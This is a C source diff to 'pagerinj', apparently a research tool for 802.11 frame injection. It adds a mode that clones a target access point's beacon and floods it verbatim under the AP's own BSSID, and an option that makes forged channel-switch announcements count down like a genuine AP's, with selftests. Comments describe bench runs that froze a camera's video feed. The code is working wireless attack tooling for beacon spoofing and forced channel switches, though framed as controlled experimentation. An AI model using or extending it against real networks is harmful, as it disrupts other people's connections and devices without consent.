@@ -362,6 +362,40 @@ static size_t csa_frame_build(const uint8_t *in, size_t in_len,
     return (size_t)(p - out);
 }
 
+/* Clone a captured beacon and transmit it VERBATIM -- no CSA, no eCSA, nothing appended.
+ *
+ * ⚠ THIS IS 17a's MISSING CONTROL, and without it every 17a result is confounded.  Measured on the
+ * bench 2026-11-10: a CSA-bearing clone froze a camera's video feed for the duration of the run and
+ * the feed recovered by itself afterwards -- identically for --count 0 and --count 3.  The natural
+ * reading is that the client honoured the announced switch.  But ~95 spoofed beacons carrying the
+ * AP's own BSSID is an equally good explanation for a frozen feed, and the two were never
+ * separated: the one thing that distinguishes them is the SAME flood with the element left off,
+ * which this tool could not produce, because --csa is what appends it.  CLAUDE.md names exactly
+ * this run as the falsifier for "a CSA-bearing cloned beacon disrupts a live client" and records
+ * that it was not runnable.  Now it is.
+ *
+ * Read the result this way, and note it cuts both ways:
+ *   feed freezes here too  -> the element is irrelevant; we have been measuring beacon spoofing,
+ *                             and 17a's "count makes no difference" result is about nothing.
+ *   feed does NOT freeze   -> the element is doing the work, and the count-0-vs-count-3 result
+ *                             stands as a statement about the CSA.
+ *
+ * Same clone source discipline as --csa: capture_beacon() still skips beacons that already carry a
+ * CSA or eCSA, because a clone of one of those is not a control. */
+static size_t clone_frame_build(const uint8_t *in, size_t in_len, uint8_t *out, size_t out_cap)
+{
+    if (in_len < IE_START)
+        return 0;
+    if (in[0] != FC_MGMT_BEACON_0 || (in[1] & 0x0c) != 0x00)
+        return 0;
+    if (RTAP_TX_LEN + in_len > out_cap)
+        return 0;
+
+    memcpy(out, RTAP_TX, RTAP_TX_LEN);
+    memcpy(out + RTAP_TX_LEN, in, in_len);
+    return RTAP_TX_LEN + in_len;
+}
+
 /* A unicast Spectrum-Management CSA action frame: category 0, action code 4, then the CSA element.
  *
  * Why this frame is interesting: mac80211_mlme.c:7506 tags it PROT_ACTION from the category alone,
@@ -467,6 +501,41 @@ static const uint8_t *ie_find(const uint8_t *f, size_t flen, uint8_t eid)
         off += 2 + elen;
     }
     return NULL;
+}
+
+/* Locate the Channel Switch Count byte inside an already-built frame, for --count-dec.
+ *
+ * It FINDS the element rather than computing an offset, deliberately.  The offset would be
+ * RTAP_TX_LEN + clone_len + 4, which depends on the radiotap length (--phy-rate changes it) and on
+ * the captured beacon's length -- and a wrong offset would not fail, it would silently rewrite an
+ * arbitrary byte of the frame once per transmission.  ie_find() returns the FIRST element of that
+ * id, which is ours: capture_beacon() refuses a clone source that already carries one.
+ *
+ * `f` is the whole built frame, radiotap included.  NULL when there is no such element. */
+static uint8_t *csa_count_ptr(uint8_t *f, size_t flen)
+{
+    const uint8_t *e;
+    if (flen <= RTAP_TX_LEN) return NULL;
+    e = ie_find(f + RTAP_TX_LEN, flen - RTAP_TX_LEN, EID_CSA);
+    if (!e || e[1] != CSA_IE_LEN) return NULL;
+    return (uint8_t *)e + 4;                       /* eid len mode chan COUNT */
+}
+
+/* One step of --count-dec's countdown: 3, 2, 1, 0, then back to the top.  Factored out of the
+ * transmit loop purely so the selftest can pin the wrap -- a test that re-implements the stepping
+ * would pass whatever the loop did. */
+static long count_dec_step(long cur, long top)
+{
+    return cur > 0 ? cur - 1 : top;
+}
+
+static uint8_t *ecsa_count_ptr(uint8_t *f, size_t flen)
+{
+    const uint8_t *e;
+    if (flen <= RTAP_TX_LEN) return NULL;
+    e = ie_find(f + RTAP_TX_LEN, flen - RTAP_TX_LEN, EID_ECSA);
+    if (!e || e[1] != ECSA_IE_LEN) return NULL;
+    return (uint8_t *)e + 5;                       /* eid len mode opclass chan COUNT */
 }
 
 /* A beacon that already carries a CSA (37) or eCSA (60) element is not a clean clone source.  The
@@ -630,6 +699,67 @@ static int selftest(void)
     st("third arm: rejects an undersized output buffer",
        csa_frame_build(FIX_BEACON, sizeof FIX_BEACON, 1, 52, 0, 3, 118, buf,
                        RTAP_TX_LEN + sizeof FIX_BEACON + 5) == 0);
+
+    /* --- --clone: 17a's CONTROL arm.  Its entire value is that NOTHING is appended. --- */
+    uint8_t cl[2048];
+    size_t ncl = clone_frame_build(FIX_BEACON, sizeof FIX_BEACON, cl, sizeof cl);
+    st("clone frame: length is radiotap + the beacon and not one byte more",
+       ncl == RTAP_TX_LEN + sizeof FIX_BEACON);
+    st("clone frame: radiotap header intact", st_eqmem(cl, RTAP_TX, RTAP_TX_LEN));
+    st("clone frame: the beacon is byte-identical to the capture",
+       st_eqmem(cl + RTAP_TX_LEN, FIX_BEACON, sizeof FIX_BEACON));
+    st("clone frame: carries NO CSA element -- that is what makes it a control",
+       ie_find(cl + RTAP_TX_LEN, ncl - RTAP_TX_LEN, EID_CSA) == NULL);
+    st("clone frame: and no eCSA either",
+       ie_find(cl + RTAP_TX_LEN, ncl - RTAP_TX_LEN, EID_ECSA) == NULL);
+    st("clone frame: IS the --csa count-0 arm minus exactly its 5 appended bytes",
+       na == ncl + 5 && st_eqmem(cl, a, ncl));
+    st("clone frame: rejects a non-beacon",
+       clone_frame_build((const uint8_t[IE_START]){ 0x40 }, IE_START, cl, sizeof cl) == 0);
+    st("clone frame: rejects a too-short frame",
+       clone_frame_build(FIX_BEACON, 8, cl, sizeof cl) == 0);
+    st("clone frame: rejects an undersized output buffer",
+       clone_frame_build(FIX_BEACON, sizeof FIX_BEACON, cl, 16) == 0);
+
+    /* --- --count-dec: the count is rewritten in place, and nothing else in the frame moves. --- */
+    uint8_t d1[2048], d2[2048];
+    size_t nd = csa_frame_build(FIX_BEACON, sizeof FIX_BEACON, 1, 36, 3, -1, 0, d1, sizeof d1);
+    uint8_t *cp = csa_count_ptr(d1, nd);
+    st("count ptr: found by SEARCHING the built frame, not by computing an offset", cp != NULL);
+    st("count ptr: holds the count that was built in", cp && *cp == 3);
+    st("count ptr: is the last byte of a CSA-only frame", cp == d1 + nd - 1);
+    memcpy(d2, d1, nd);
+    if (cp) *cp = (uint8_t)count_dec_step(3, 3);          /* one step of the real countdown */
+    int ddiffs = 0, ddiff_at = -1;
+    for (size_t i = 0; i < nd; i++)
+        if (d1[i] != d2[i]) { ddiffs++; ddiff_at = (int)i; }
+    st("count dec: one step changes exactly ONE byte", ddiffs == 1);
+    st("count dec: and that byte is the count", ddiff_at == (int)nd - 1);
+    st("count dec: the step wrote 2 over 3", d1[nd - 1] == 2 && d2[nd - 1] == 3);
+    st("count ptr: NULL on a clone frame, which is why --count-dec requires --csa",
+       csa_count_ptr(cl, ncl) == NULL);
+
+    /* The countdown sequence itself, including the wrap back to the top. */
+    {
+        const uint8_t want_seq[] = { 3, 2, 1, 0, 3, 2, 1, 0 };
+        long cur = 3; int seq_ok = 1;
+        for (size_t i = 0; i < sizeof want_seq; i++) {
+            if ((uint8_t)cur != want_seq[i]) seq_ok = 0;
+            cur = count_dec_step(cur, 3);
+        }
+        st("count dec: the sequence is 3,2,1,0 and then back to 3", seq_ok);
+        st("count dec: --count 1 alternates 1,0 rather than sticking",
+           count_dec_step(1, 1) == 0 && count_dec_step(0, 1) == 1);
+    }
+
+    /* The eCSA count, so --count-dec steps the third arm's element too. */
+    uint8_t d3[2048];
+    size_t nd3 = csa_frame_build(FIX_BEACON, sizeof FIX_BEACON, 1, 36, 3, 5, 118, d3, sizeof d3);
+    uint8_t *ep = ecsa_count_ptr(d3, nd3);
+    st("ecsa count ptr: found when an eCSA is present", ep != NULL);
+    st("ecsa count ptr: holds the eCSA count, not the CSA one", ep && *ep == 5);
+    st("ecsa count ptr: is the frame's last byte when the eCSA is last", ep == d3 + nd3 - 1);
+    st("ecsa count ptr: NULL when no eCSA was appended", ecsa_count_ptr(d1, nd) == NULL);
 
     /* --- the unicast action frame --- */
     const uint8_t cli[6]  = { 0xaa,0xbb,0xcc,0xdd,0xee,0xff };
@@ -942,7 +1072,8 @@ static void usage(void)
       "\n"
       "  pagerinj --selftest\n"
       "  pagerinj -i <iface> --nonce <text> [--chan N] [--rate N] [--secs N] [--phy-rate M]\n"
-      "  pagerinj -i <iface> --csa --bssid <mac> --chan N --count N\n"
+      "  pagerinj -i <iface> --clone --bssid <mac> [--rate N] [--secs N] [--wait N]\n"
+      "  pagerinj -i <iface> --csa --bssid <mac> --chan N --count N [--count-dec]\n"
       "                      [--ecsa-count N --ecsa-opclass N] [--allow-same-chan]\n"
       "                      [--mode N] [--rate N] [--secs N] [--wait N] [--phy-rate M]\n"
       "  pagerinj -i <iface> --action --bssid <mac> --client <mac> --chan N --count N\n"
@@ -958,6 +1089,14 @@ static void usage(void)
       "                 only the nonce beacon's own DS Parameter Set (default 1): set it to the\n"
       "                 channel you parked the interface on.\n"
       "  --allow-same-chan  transmit a --csa clone even though --chan equals its DS channel.\n"
+      "  --clone        clone one beacon from --bssid and flood it VERBATIM -- no CSA element at\n"
+      "                 all.  17a's control arm: it separates \"the client honoured the switch\"\n"
+      "                 from \"the client was upset by a flood of spoofed beacons\", which the\n"
+      "                 two-arm count experiment cannot.  Needs no --chan and no --count.\n"
+      "  --count-dec    decrement the count on every frame, 3..0 then repeat, as a real AP does.\n"
+      "                 Without it the count is CONSTANT, which no AP ever sends and which is the\n"
+      "                 strongest surviving reason 17a's count-3 arm behaved like count 0.\n"
+      "                 Needs --csa and --count 1 or more.\n"
       "  --count        0-255.  CSA Channel Switch Count.  pineapd hardcodes 0, which the kernel\n"
       "                 discards before the auth/assoc refusal check.  17a is 0 vs 3.\n"
       "  --mode         0-255.  CSA Channel Switch Mode (default 1, matching pineapd)\n"
@@ -989,7 +1128,8 @@ static void usage(void)
 int main(int argc, char **argv)
 {
     const char *ifname = NULL, *nonce = NULL;
-    int do_csa = 0, do_nonce = 0, do_action = 0, chan = 0, count = -1, mode = 1;
+    int do_csa = 0, do_nonce = 0, do_action = 0, do_clone = 0, count_dec = 0;
+    int chan = 0, count = -1, mode = 1;
     int rate = 10, secs = 10, wait_s = 10, phy_rate = 0, allow_same = 0;
     int ecsa_count = -1, ecsa_opclass = -1;
     uint8_t bssid[6]; int have_bssid = 0;
@@ -1003,6 +1143,8 @@ int main(int argc, char **argv)
         else if (!strcmp(a, "-i"))         ifname = NEXT();
         else if (!strcmp(a, "--nonce"))  { do_nonce = 1; nonce = NEXT(); }
         else if (!strcmp(a, "--csa"))      do_csa = 1;
+        else if (!strcmp(a, "--clone"))    do_clone = 1;
+        else if (!strcmp(a, "--count-dec")) count_dec = 1;
         else if (!strcmp(a, "--action"))   do_action = 1;
         else if (!strcmp(a, "--allow-same-chan")) allow_same = 1;
         else if (!strcmp(a, "--bssid"))  { if (parse_mac(NEXT(), bssid) < 0) { usage(); return 2; } have_bssid = 1; }
@@ -1021,7 +1163,7 @@ int main(int argc, char **argv)
         #undef NEXT
     }
 
-    if (do_csa + do_nonce + do_action != 1) { usage(); return 2; }
+    if (do_csa + do_nonce + do_action + do_clone != 1) { usage(); return 2; }
     if (!ifname)                            { usage(); return 2; }
     if (ecsa_count >= 0) {
         /* Not defaulted, and the reason is narrower than this comment first claimed.  Both halves
@@ -1049,6 +1191,16 @@ int main(int argc, char **argv)
     }
     if (do_csa || do_action) {
         if (!have_bssid || chan <= 0 || count < 0) { usage(); return 2; }
+    }
+    if (do_clone && !have_bssid) {
+        fprintf(stderr, "--clone needs --bssid: it clones that BSS's own beacon\n");
+        usage(); return 2;
+    }
+    if (count_dec) {
+        /* --count 0 --count-dec would hold the byte at 0 for the whole run, which is just --count 0
+         * with extra steps, and reads in a log as though a countdown happened.  Refuse it. */
+        if (!do_csa)      { fprintf(stderr, "--count-dec needs --csa\n");                usage(); return 2; }
+        if (count < 1)    { fprintf(stderr, "--count-dec needs --count 1 or more\n");    usage(); return 2; }
     }
     if (do_action && !have_client) {
         fprintf(stderr, "--action needs --client (A1) as well as --bssid (A2/A3)\n");
@@ -1119,6 +1271,15 @@ int main(int argc, char **argv)
         if (skipped > 0)
             fprintf(stderr, "note: skipped %d CSA-bearing beacon(s) from this BSSID before a clean one "
                             "arrived -- something else is announcing a switch for it\n", skipped);
+        if (do_clone) {
+            flen = clone_frame_build(cap, clen, frame, sizeof frame);
+            if (!flen) { fprintf(stderr, "could not build the clone frame\n"); close(fd); return 1; }
+            fprintf(stderr, "cloned %zu-byte beacon VERBATIM -- no CSA, no eCSA, nothing appended; "
+                            "%zu bytes\n", clen, flen);
+            fprintf(stderr, "this is 17a's CONTROL arm: whatever the client does now, it is not "
+                            "doing it because of a channel-switch element\n");
+            goto transmit;
+        }
         if (same_chan_refused(cap, clen, chan, allow_same)) {
             fprintf(stderr, "refusing to transmit: --chan %d is the channel this beacon's DS Parameter "
                             "Set says the BSS is already on.  A same-channel CSA announces no move "
@@ -1140,6 +1301,7 @@ int main(int argc, char **argv)
                     clen, mode, chan, count, flen);
     }
 
+transmit:
     if (phy_rate)
         fprintf(stderr, "radiotap: RATE field %d Mbps (%d x 500 kbps), it_len %zu\n",
                 phy_rate, phy_rate * 2, RTAP_TX_LEN);
@@ -1151,11 +1313,38 @@ int main(int argc, char **argv)
     sigaction(SIGINT, &sa, NULL);
     sigaction(SIGTERM, &sa, NULL);
 
+    /* --count-dec.  A conformant AP DECREMENTS the Channel Switch Count on every beacon -- 3, 2,
+     * 1, 0 -- and switches when it reaches zero.  pagerinj has always sent a CONSTANT count, which
+     * is not what any real AP looks like, and that is the strongest surviving reason the count-3
+     * arm of 17a behaved no differently from count 0 on the bench (CLAUDE.md "Fourth contact",
+     * reason 3).  A client that tracks the countdown has nothing to track in a constant stream.
+     *
+     * The byte is rewritten in place, in the already-built frame, so nothing else about the frame
+     * changes between transmissions -- which is the property the selftest asserts.  After reaching
+     * 0 the countdown restarts, so a --secs window gives the client several complete countdowns
+     * rather than one 4-beacon burst at the start. */
+    uint8_t *cnt_p = NULL, *ecnt_p = NULL;
+    long cnt_cur = count, cycles = 0;
+    if (count_dec) {
+        cnt_p = csa_count_ptr(frame, flen);
+        if (!cnt_p) {
+            fprintf(stderr, "--count-dec: the built frame carries no CSA element to decrement\n");
+            close(fd); return 1;
+        }
+        ecnt_p = ecsa_count_ptr(frame, flen);
+        fprintf(stderr, "count-dec: counting %d..0 and repeating (%s)\n", count,
+                ecnt_p ? "CSA and eCSA together" : "CSA only");
+    }
+
     long sent = 0, failed = 0;
     time_t end = secs > 0 ? time(NULL) + secs : 0;
     long interval_ns = 1000000000L / rate;
     while (!stop_flag) {
         if (end && time(NULL) >= end) break;
+        if (count_dec) {
+            *cnt_p = (uint8_t)cnt_cur;
+            if (ecnt_p) *ecnt_p = (uint8_t)cnt_cur;
+        }
         if (tx(fd, ifindex, frame, flen) < 0) {
             /* A stop signal landing inside a sendto() blocked on sndbuf space returns EINTR
              * (sock_alloc_send_pskb() -> sock_intr_errno(), sock.c:2885-2896 and sock.h:2542-2545
@@ -1167,12 +1356,18 @@ int main(int argc, char **argv)
         } else {
             sent++;
         }
+        if (count_dec) {
+            if (cnt_cur == 0) cycles++;
+            cnt_cur = count_dec_step(cnt_cur, count);
+        }
         struct timespec ts = { interval_ns / 1000000000L, interval_ns % 1000000000L };
         nanosleep(&ts, NULL);
     }
 
     /* sendto() reporting success proves nothing: a cfg80211-blocked frame is freed and the path
      * returns NETDEV_TX_OK.  Only the external receiver can tell you it was transmitted. */
+    if (count_dec)
+        fprintf(stderr, "count-dec: %ld complete countdown(s) of %d..0\n", cycles, count);
     fprintf(stderr, "%ssent=%ld failed=%ld  (sendto success does NOT mean transmitted — "
                     "confirm at the external receiver)\n",
             stop_flag ? "interrupted: " : "", sent, failed);
